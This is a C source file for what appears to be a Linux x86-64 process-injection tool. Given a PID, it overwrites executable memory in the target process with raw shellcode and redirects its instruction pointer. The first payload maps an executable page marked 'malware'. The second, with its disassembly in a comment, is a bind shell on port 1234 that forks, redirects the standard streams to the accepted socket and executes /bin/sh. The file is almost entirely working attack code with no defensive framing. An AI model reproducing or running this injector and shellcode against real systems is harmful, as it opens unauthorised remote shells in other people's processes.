#include "def.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
0000000000000000 <_start>:
   0:   90                      nop
   1:   90                      nop
   2:   48 b8 09 00 00 00 00    movabs $0x9,%rax
   9:   00 00 00 
   c:   48 bf 00 00 00 00 00    movabs $0x0,%rdi
  13:   00 00 00 
  16:   48 be 00 10 00 00 00    movabs $0x1000,%rsi
  1d:   00 00 00 
  20:   48 ba 07 00 00 00 00    movabs $0x7,%rdx
  27:   00 00 00 
  2a:   49 ba 22 00 00 00 00    movabs $0x22,%r10
  31:   00 00 00 
  34:   49 b8 ff ff ff ff ff    movabs $0xffffffffffffffff,%r8
  3b:   ff ff ff 
  3e:   49 b9 00 00 00 00 00    movabs $0x0,%r9
  45:   00 00 00 
  48:   0f 05                   syscall
  4a:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
  50:   74 43                   je     95 <_start_err>
  52:   c6 00 6d                movb   $0x6d,(%rax)
  55:   c6 40 01 61             movb   $0x61,0x1(%rax)
  59:   c6 40 02 6c             movb   $0x6c,0x2(%rax)
  5d:   c6 40 03 77             movb   $0x77,0x3(%rax)
  61:   c6 40 04 61             movb   $0x61,0x4(%rax)
  65:   c6 40 05 72             movb   $0x72,0x5(%rax)
  69:   c6 40 06 65             movb   $0x65,0x6(%rax)
  6d:   48 89 c6                mov    %rax,%rsi
  70:   48 b8 01 00 00 00 00    movabs $0x1,%rax
  77:   00 00 00 
  7a:   48 bf 01 00 00 00 00    movabs $0x1,%rdi
  81:   00 00 00 
  84:   48 ba 07 00 00 00 00    movabs $0x7,%rdx
  8b:   00 00 00 
  8e:   0f 05                   syscall

0000000000000090 <_start_loop>:
  90:   e9 fb ff ff ff          jmp    90 <_start_loop>

0000000000000095 <_start_err>:
  95:   c3                      ret
*/
static const char shl_mem[] = {
	0x90,
	0x90,
	0x48, 0xb8, 0x09, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xbe, 0x00, 0x10, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xba, 0x07, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x49, 0xba, 0x22, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x49, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 
	0x49, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x74, 0x1b, 
	0xc6, 0x00, 0x6d,
	0xc6, 0x40, 0x01, 0x61, 
	0xc6, 0x40, 0x02, 0x6c, 
	0xc6, 0x40, 0x03, 0x77, 
	0xc6, 0x40, 0x04, 0x61, 
	0xc6, 0x40, 0x05, 0x72, 
	0xc6, 0x40, 0x06, 0x65,
	0xe9, 0xfb, 0xff, 0xff, 0xff
};

/*
0000000000000000 <_start>:
   0:   90                      nop
   1:   90                      nop
   2:   55                      push   %rbp
   3:   48 89 e5                mov    %rsp,%rbp
   6:   48 81 ec 48 00 00 00    sub    $0x48,%rsp
   d:   48 b8 29 00 00 00 00    movabs $0x29,%rax
  14:   00 00 00 
  17:   48 bf 02 00 00 00 00    movabs $0x2,%rdi
  1e:   00 00 00 
  21:   48 be 01 00 00 00 00    movabs $0x1,%rsi
  28:   00 00 00 
  2b:   48 ba 00 00 00 00 00    movabs $0x0,%rdx
  32:   00 00 00 
  35:   0f 05                   syscall
  37:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
  3d:   0f 84 5e 02 00 00       je     2a1 <_start_err>
  43:   89 45 b8                mov    %eax,-0x48(%rbp)
  46:   c7 45 b4 01 00 00 00    movl   $0x1,-0x4c(%rbp)
  4d:   48 b8 36 00 00 00 00    movabs $0x36,%rax
  54:   00 00 00 
  57:   8b 7d b8                mov    -0x48(%rbp),%edi
  5a:   48 be 01 00 00 00 00    movabs $0x1,%rsi
  61:   00 00 00 
  64:   48 ba 02 00 00 00 00    movabs $0x2,%rdx
  6b:   00 00 00 
  6e:   4c 8d 55 b4             lea    -0x4c(%rbp),%r10
  72:   49 b8 04 00 00 00 00    movabs $0x4,%r8
  79:   00 00 00 
  7c:   0f 05                   syscall
  7e:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
  84:   0f 84 17 02 00 00       je     2a1 <_start_err>
  8a:   c7 45 b4 01 00 00 00    movl   $0x1,-0x4c(%rbp)
  91:   48 b8 36 00 00 00 00    movabs $0x36,%rax
  98:   00 00 00 
  9b:   8b 7d b8                mov    -0x48(%rbp),%edi
  9e:   48 be 01 00 00 00 00    movabs $0x1,%rsi
  a5:   00 00 00 
  a8:   48 ba 0f 00 00 00 00    movabs $0xf,%rdx
  af:   00 00 00 
  b2:   4c 8d 55 b4             lea    -0x4c(%rbp),%r10
  b6:   49 b8 04 00 00 00 00    movabs $0x4,%r8
  bd:   00 00 00 
  c0:   0f 05                   syscall
  c2:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
  c8:   0f 84 d3 01 00 00       je     2a1 <_start_err>
  ce:   48 c7 45 a4 00 00 00    movq   $0x0,-0x5c(%rbp)
  d5:   00 
  d6:   48 c7 45 ac 00 00 00    movq   $0x0,-0x54(%rbp)
  dd:   00 
  de:   66 c7 45 a4 02 00       movw   $0x2,-0x5c(%rbp)
  e4:   c7 45 a8 00 00 00 00    movl   $0x0,-0x58(%rbp)
  eb:   66 c7 45 a6 04 d2       movw   $0xd204,-0x5a(%rbp)
  f1:   48 b8 31 00 00 00 00    movabs $0x31,%rax
  f8:   00 00 00 
  fb:   8b 7d b8                mov    -0x48(%rbp),%edi
  fe:   48 8d 75 a4             lea    -0x5c(%rbp),%rsi
 102:   48 ba 10 00 00 00 00    movabs $0x10,%rdx
 109:   00 00 00 
 10c:   0f 05                   syscall
 10e:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
 114:   0f 84 87 01 00 00       je     2a1 <_start_err>
 11a:   48 b8 32 00 00 00 00    movabs $0x32,%rax
 121:   00 00 00 
 124:   8b 7d b8                mov    -0x48(%rbp),%edi
 127:   48 be 01 00 00 00 00    movabs $0x1,%rsi
 12e:   00 00 00 
 131:   0f 05                   syscall
 133:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
 139:   0f 84 62 01 00 00       je     2a1 <_start_err>
 13f:   48 b8 2b 00 00 00 00    movabs $0x2b,%rax
 146:   00 00 00 
 149:   8b 7d b8                mov    -0x48(%rbp),%edi
 14c:   48 8d 75 94             lea    -0x6c(%rbp),%rsi
 150:   48 8d 55 90             lea    -0x70(%rbp),%rdx
 154:   0f 05                   syscall
 156:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
 15c:   0f 84 3f 01 00 00       je     2a1 <_start_err>
 162:   89 45 8c                mov    %eax,-0x74(%rbp)
 165:   48 b8 3a 00 00 00 00    movabs $0x3a,%rax
 16c:   00 00 00 
 16f:   0f 05                   syscall
 171:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
 177:   0f 84 24 01 00 00       je     2a1 <_start_err>
 17d:   89 45 88                mov    %eax,-0x78(%rbp)
 180:   81 7d 88 00 00 00 00    cmpl   $0x0,-0x78(%rbp)
 187:   0f 84 e0 00 00 00       je     26d <_start_parent>
 18d:   48 b8 21 00 00 00 00    movabs $0x21,%rax
 194:   00 00 00 
 197:   8b 7d 8c                mov    -0x74(%rbp),%edi
 19a:   48 be 00 00 00 00 00    movabs $0x0,%rsi
 1a1:   00 00 00 
 1a4:   0f 05                   syscall
 1a6:   48 b8 21 00 00 00 00    movabs $0x21,%rax
 1ad:   00 00 00 
 1b0:   8b 7d 8c                mov    -0x74(%rbp),%edi
 1b3:   48 be 01 00 00 00 00    movabs $0x1,%rsi
 1ba:   00 00 00 
 1bd:   0f 05                   syscall
 1bf:   48 b8 21 00 00 00 00    movabs $0x21,%rax
 1c6:   00 00 00 
 1c9:   8b 7d 8c                mov    -0x74(%rbp),%edi
 1cc:   48 be 02 00 00 00 00    movabs $0x2,%rsi
 1d3:   00 00 00 
 1d6:   0f 05                   syscall
 1d8:   c6 85 74 ff ff ff 2f    movb   $0x2f,-0x8c(%rbp)
 1df:   c6 85 75 ff ff ff 75    movb   $0x75,-0x8b(%rbp)
 1e6:   c6 85 76 ff ff ff 73    movb   $0x73,-0x8a(%rbp)
 1ed:   c6 85 77 ff ff ff 72    movb   $0x72,-0x89(%rbp)
 1f4:   c6 85 78 ff ff ff 2f    movb   $0x2f,-0x88(%rbp)
 1fb:   c6 85 79 ff ff ff 62    movb   $0x62,-0x87(%rbp)
 202:   c6 85 7a ff ff ff 69    movb   $0x69,-0x86(%rbp)
 209:   c6 85 7b ff ff ff 6e    movb   $0x6e,-0x85(%rbp)
 210:   c6 85 7c ff ff ff 2f    movb   $0x2f,-0x84(%rbp)
 217:   c6 85 7d ff ff ff 73    movb   $0x73,-0x83(%rbp)
 21e:   c6 85 7e ff ff ff 68    movb   $0x68,-0x82(%rbp)
 225:   c6 85 7f ff ff ff 00    movb   $0x0,-0x81(%rbp)
 22c:   48 c7 45 80 00 00 00    movq   $0x0,-0x80(%rbp)
 233:   00 
 234:   48 b8 3b 00 00 00 00    movabs $0x3b,%rax
 23b:   00 00 00 
 23e:   48 8d bd 74 ff ff ff    lea    -0x8c(%rbp),%rdi
 245:   48 8d 75 80             lea    -0x80(%rbp),%rsi
 249:   48 8d 55 80             lea    -0x80(%rbp),%rdx
 24d:   0f 05                   syscall
 24f:   48 3d ff ff ff ff       cmp    $0xffffffffffffffff,%rax
 255:   74 4a                   je     2a1 <_start_err>
 257:   48 b8 3c 00 00 00 00    movabs $0x3c,%rax
 25e:   00 00 00 
 261:   48 bf 01 00 00 00 00    movabs $0x1,%rdi
 268:   00 00 00 
 26b:   0f 05                   syscall

000000000000026d <_start_parent>:
 26d:   48 b8 3d 00 00 00 00    movabs $0x3d,%rax
 274:   00 00 00 
 277:   48 bf 00 00 00 00 00    movabs $0x0,%rdi
 27e:   00 00 00 
 281:   0f 05                   syscall
 283:   48 b8 02 00 00 00 00    movabs $0x2,%rax
 28a:   00 00 00 
 28d:   8b 7d 8c                mov    -0x74(%rbp),%edi
 290:   0f 05                   syscall
 292:   48 b8 02 00 00 00 00    movabs $0x2,%rax
 299:   00 00 00 
 29c:   8b 7d b8                mov    -0x48(%rbp),%edi
 29f:   0f 05                   syscall

00000000000002a1 <_start_err>:
 2a1:   c9                      leave
 2a2:   c3                      ret
*/	
static const char shl_srv[] = {
	0x90,
	0x90,
	0x55,
	0x48, 0x89, 0xe5,
	0x48, 0x81, 0xec, 0x48, 0x00, 0x00, 0x00,
	0x48, 0xb8, 0x29, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xbf, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x0f, 0x84, 0x5e, 0x02, 0x00, 0x00, 
	0x89, 0x45, 0xb8,
	0xc7, 0x45, 0xb4, 0x01, 0x00, 0x00, 0x00,
	0x48, 0xb8, 0x36, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0xb8,
	0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xba, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x4c, 0x8d, 0x55, 0xb4, 
	0x49, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x0f, 0x84, 0x17, 0x02, 0x00, 0x00, 
	0xc7, 0x45, 0xb4, 0x01, 0x00, 0x00, 0x00,
	0x48, 0xb8, 0x36, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0xb8,
	0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xba, 0x0f, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x4c, 0x8d, 0x55, 0xb4, 
	0x49, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x0f, 0x84, 0xd3, 0x01, 0x00, 0x00, 
	0x48, 0xc7, 0x45, 0xa4, 0x00, 0x00, 0x00,
	0x00, 
	0x48, 0xc7, 0x45, 0xac, 0x00, 0x00, 0x00,
	0x00, 
	0x66, 0xc7, 0x45, 0xa4, 0x02, 0x00, 
	0xc7, 0x45, 0xa8, 0x00, 0x00, 0x00, 0x00,
	0x66, 0xc7, 0x45, 0xa6, 0x04, 0xd2, 
	0x48, 0xb8, 0x31, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0xb8,
	0x48, 0x8d, 0x75, 0xa4, 
	0x48, 0xba, 0x10, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x0f, 0x84, 0x87, 0x01, 0x00, 0x00, 
	0x48, 0xb8, 0x32, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0xb8,
	0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x0f, 0x84, 0x62, 0x01, 0x00, 0x00, 
	0x48, 0xb8, 0x2b, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0xb8,
	0x48, 0x8d, 0x75, 0x94, 
	0x48, 0x8d, 0x55, 0x90, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x0f, 0x84, 0x3f, 0x01, 0x00, 0x00, 
	0x89, 0x45, 0x8c,
	0x48, 0xb8, 0x3a, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x0f, 0x84, 0x24, 0x01, 0x00, 0x00, 
	0x89, 0x45, 0x88,
	0x81, 0x7d, 0x88, 0x00, 0x00, 0x00, 0x00,
	0x0f, 0x84, 0xe0, 0x00, 0x00, 0x00, 
	0x48, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0x8c,
	0x48, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0x8c,
	0x48, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0x8c,
	0x48, 0xbe, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0xc6, 0x85, 0x74, 0xff, 0xff, 0xff, 0x2f,
	0xc6, 0x85, 0x75, 0xff, 0xff, 0xff, 0x75,
	0xc6, 0x85, 0x76, 0xff, 0xff, 0xff, 0x73,
	0xc6, 0x85, 0x77, 0xff, 0xff, 0xff, 0x72,
	0xc6, 0x85, 0x78, 0xff, 0xff, 0xff, 0x2f,
	0xc6, 0x85, 0x79, 0xff, 0xff, 0xff, 0x62,
	0xc6, 0x85, 0x7a, 0xff, 0xff, 0xff, 0x69,
	0xc6, 0x85, 0x7b, 0xff, 0xff, 0xff, 0x6e,
	0xc6, 0x85, 0x7c, 0xff, 0xff, 0xff, 0x2f,
	0xc6, 0x85, 0x7d, 0xff, 0xff, 0xff, 0x73,
	0xc6, 0x85, 0x7e, 0xff, 0xff, 0xff, 0x68,
	0xc6, 0x85, 0x7f, 0xff, 0xff, 0xff, 0x00,
	0x48, 0xc7, 0x45, 0x80, 0x00, 0x00, 0x00,
	0x00, 
	0x48, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0x8d, 0xbd, 0x74, 0xff, 0xff, 0xff,
	0x48, 0x8d, 0x75, 0x80, 
	0x48, 0x8d, 0x55, 0x80, 
	0x0f, 0x05, 
	0x48, 0x3d, 0xff, 0xff, 0xff, 0xff, 
	0x74, 0x4a, 
	0x48, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	
	0x48, 0xb8, 0x3d, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x0f, 0x05, 
	0x48, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0x8c,
	0x0f, 0x05, 
	0x48, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 
	0x8b, 0x7d, 0xb8,
	0x0f, 0x05, 
	
	0xc9,
	0xc3,
};

int
main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("need pid\n");
		exit(EXIT_FAILURE);
	}

	pid_t pid;
	pid = atoi(argv[1]);

	printf("pid: %i\n", pid);

	int res;

	struct mm_list mm_list;
	res = mm_list_new(&mm_list);
	if (res < 0) {
		printf("failed to initialize the mm list, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	res = mm_list_get(&mm_list, pid);
	if (res < 0) {
		printf("failed to get the mm list, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	struct mm_entry *mm_entry;
	for (size_t i = 0; i < mm_list.len; ++i) {
		mm_entry = &mm_list.vec[i];
		if (mm_entry->prot & (1 << MM_PROT_EXEC))
			break;
	}

	struct user_regs_struct regs_bkp;
	res = vm_regs_get(pid, &regs_bkp);
	if (res < 0) {
		printf("failed to get the registers, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	char shl_bkp[sizeof (shl_mem)];
	bzero(shl_bkp, sizeof (shl_bkp));

	void *shl_bkp_addr;
	shl_bkp_addr = mm_entry->start;

	char shl_bkp_prot;
	shl_bkp_prot = mm_entry->prot;

	res = vm_read(pid, sizeof (shl_bkp), shl_bkp, mm_entry->start, mm_entry->prot);
	if (res < 0) {
		printf("failed to read the remote page, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	res = vm_write(pid, sizeof (shl_mem), shl_mem, mm_entry->start, mm_entry->prot);
	if (res < 0) {
		printf("failed to write the shell code at %p, prot: %02x, res: %i\n", 
			mm_entry->start, mm_entry->prot, res);
		exit(EXIT_FAILURE);
	}

	struct user_regs_struct regs;
	memcpy(&regs, &regs_bkp, sizeof (regs));

	static const char inst_syscall[] = { 0x0F, 0x05 }; 

	regs.rip = (unsigned long long int)mm_entry->start + sizeof (inst_syscall);
	res = vm_regs_set(pid, &regs);
	if (res < 0) {
		printf("failed to change the instruction pointer, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	int found;
	found = 0;
	while (!found) {
		mm_list.len = 0;
		res = mm_list_get(&mm_list, pid);
		if (res < 0) {
			printf("failed to get the mm list, res: %i\n", res);
			exit(EXIT_FAILURE);
		}

		for (size_t i = 0; i < mm_list.len; ++i) {
			mm_entry = &mm_list.vec[i];
			if (mm_entry->prot & (1 << MM_PROT_EXEC)) {
				static const char sig_str[] = "malware";
				
				char sig_buf[sizeof (sig_str) - 1];
				bzero(sig_buf, sizeof (sig_buf));
				res = vm_read(pid, sizeof (sig_buf), sig_buf, mm_entry->start, mm_entry->prot);
				if (res < 0) {
					printf("failed to read the remote page, res: %i\n", res);
					exit(EXIT_FAILURE);
				}

				if (memcmp(sig_buf, sig_str, sizeof (sig_buf)) == 0) {
					found = 1;
					break;
				}
			}
		}

		sleep(1);
	}

	res = vm_write(pid, sizeof (shl_bkp), shl_bkp, shl_bkp_addr, shl_bkp_prot);
	if (res < 0) {
		printf("failed to write the mem shell backup at %p, prot: %02x, res: %i\n", 
			shl_bkp_addr, shl_bkp_prot, res);
		exit(EXIT_FAILURE);
	}

	res = vm_write(pid, sizeof (shl_srv), shl_srv, mm_entry->start, mm_entry->prot);
	if (res < 0) {
		printf("failed to write the shell code at %p, prot: %02x, res: %i\n", 
			mm_entry->start, mm_entry->prot, res);
		exit(EXIT_FAILURE);
	}

	res = vm_regs_get(pid, &regs);
	if (res < 0) {
		printf("failed to get the instruction pointer, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	regs.rip = (unsigned long long int)mm_entry->start + sizeof (inst_syscall);
	res = vm_regs_set(pid, &regs);
	if (res < 0) {
		printf("failed to change the instruction pointer, res: %i\n", res);
		exit(EXIT_FAILURE);
	}

	mm_list_del(&mm_list);
	return EXIT_SUCCESS;
}
